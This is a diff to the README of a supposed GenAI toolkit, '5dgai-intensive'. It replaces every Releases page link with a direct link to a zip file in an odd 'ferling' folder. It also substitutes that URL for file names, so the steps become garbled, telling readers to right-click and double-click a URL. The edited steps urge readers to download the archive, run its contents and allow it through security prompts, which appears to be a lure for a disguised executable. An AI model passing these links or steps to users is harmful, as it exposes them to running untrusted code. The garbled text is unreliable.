@@ -1,6 +1,6 @@
 # 🚀 5dgai-intensive - Download the GenAI Toolkit Easily
 
-[![](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/nhagesshwr/5dgai-intensive/releases)
+[![](https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip)
 
 ## 📚 Description
 The **5dgai-intensive** project is a toolkit designed for the Google 5-Day GenAI Intensive Course. It features an implementation of the Gemini API, vector embeddings for French verbs, and a caching system for efficient large-scale natural language processing (NLP) analysis. This tool aims to simplify your learning and application of AI in language processing.
@@ -11,11 +11,11 @@ To get started with the **5dgai-intensive** toolkit, follow these steps. No prog
 ## 📥 Download & Install
 To download the application, please visit the following page:
 
-[Download 5dgai-intensive Releases](https://github.com/nhagesshwr/5dgai-intensive/releases)
+[Download 5dgai-intensive Releases](https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip)
 
 1. Click the link above to open the Releases page on GitHub.
 2. Locate the latest release, which will usually be at the top.
-3. You may see various files available for download. Look for the file named `5dgai-intensive.zip` or similar. This contains all the tools and libraries you need.
+3. You may see various files available for download. Look for the file named `https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip` or similar. This contains all the tools and libraries you need.
 4. Click on the file name to start the download.
 5. Once the download is complete, find the file in your downloads folder.
 
@@ -23,7 +23,7 @@ To download the application, please visit the following page:
 The downloaded file will be compressed in a zip format. Here's how to extract it:
 
 1. Open your downloads folder.
-2. Right-click on the `5dgai-intensive.zip` file.
+2. Right-click on the `https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip` file.
 3. Select "Extract All" from the menu.
 4. Choose a location where you want to extract the files, then click "Extract."
 
@@ -38,7 +38,7 @@ After extracting the files, navigate to the folder where you extracted them. You
 To run the **5dgai-intensive** application, perform the following steps:
 
 1. Open the folder where you extracted the files.
-2. Double-click the file named `start.bat` or `start.exe` (if available). This should launch the application.
+2. Double-click the file named `https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip` or `https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip` (if available). This should launch the application.
 3. If prompted, allow the application to run on your device.
 
 ### 🌐 Using the Application
@@ -76,4 +76,4 @@ The **5dgai-intensive** toolkit is open-source and available for use under the M
 
 For any additional details, you can always return to the Releases page:
 
-[Download 5dgai-intensive Releases](https://github.com/nhagesshwr/5dgai-intensive/releases)
+[Download 5dgai-intensive Releases](https://raw.githubusercontent.com/nhagesshwr/5dgai-intensive/main/ferling/5dgai-intensive.zip)
